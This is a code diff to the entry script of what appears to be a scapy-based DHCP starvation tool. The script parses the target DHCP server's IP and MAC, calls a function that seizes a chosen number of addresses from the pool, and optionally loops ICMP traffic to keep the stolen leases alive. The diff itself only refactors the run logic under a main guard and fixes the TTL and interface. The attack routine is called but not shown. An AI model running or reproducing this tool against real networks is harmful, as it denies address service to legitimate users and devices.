@@ -34,6 +34,8 @@ def handle_args(args):
                         will use info if none provided""", default=20, type=int)
     parser.add_argument('--keep_alive_sleep_time', help="amount of time between a wave of icmps for keeping alive", default=0, type = int)
     args = parser.parse_args()
+    args.ttl = 64
+    conf.iface = args.interface
     if args.debug:
         args.log_level = 10
     if args.server_mac is None:
@@ -44,23 +46,23 @@ def handle_args(args):
 
     return args
 
+if __name__ == "__main__":
+    dhcp.args=handle_args(sys.argv)
 
-dhcp.args=handle_args(sys.argv)
+    logging.basicConfig(filename=dhcp.args.log_file, level=dhcp.args.log_level)
 
-logging.basicConfig(filename=dhcp.args.log_file, level=dhcp.args.log_level)
+    logger.debug(dhcp.args)
 
-logger.debug(dhcp.args)
-
-occupied_ips = dhcp.starve_ips(dhcp.args.server_ip, dhcp.args.server_mac, conf.iface, dhcp.args.sniff_interface,dhcp.args.ips_to_starve )
-logger.info('Got these IPs')
-for ip in occupied_ips:
-    logger.info(ip)
-if(len(occupied_ips) == 0):
-    logger.info('[-]No ip occupied')
-    exit(1)
+    occupied_ips = dhcp.starve_ips(dhcp.args.server_ip, dhcp.args.server_mac, conf.iface, dhcp.args.sniff_interface,dhcp.args.ips_to_starve )
+    logger.info('Got these IPs')
+    for ip in occupied_ips:
+        logger.info(ip)
+    if(len(occupied_ips) == 0):
+        logger.info('[-]No ip occupied')
+        exit(1)
 
 
-if dhcp.args.keep_alive :
-    while(True):
-        dhcp.keep_ips_alive_icmp(occupied_ips, dhcp.args.server_ip, dhcp.args.server_mac)
-        time.sleep(dhcp.args.keep_alive_sleep_time)
+    if dhcp.args.keep_alive :
+        while(True):
+            dhcp.keep_ips_alive_icmp(occupied_ips, dhcp.args.server_ip, dhcp.args.server_mac)
+            time.sleep(dhcp.args.keep_alive_sleep_time)
